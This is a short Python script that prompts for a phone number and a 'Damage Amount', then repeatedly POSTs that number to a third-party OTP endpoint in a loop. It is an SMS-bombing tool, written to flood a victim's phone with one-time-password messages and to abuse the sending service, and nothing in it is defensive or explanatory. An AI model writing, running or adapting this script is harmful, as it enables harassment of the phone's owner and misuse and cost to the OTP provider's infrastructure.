import requests
from requests.structures import CaseInsensitiveDict

url = "https://addabaji.mobi/twocups-v1-robi/otp.php"


headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

name = input("Enter Your Number : ")
data ={'msisdn':name}

amount = int(input("[>] Enter Your Damage Amount : "))
i=1
while i<=amount:
  try:
    requests.post(url,headers=headers, data = data)
    print(i)
    i=i+1
  except:
    print ("Server Connection Error")
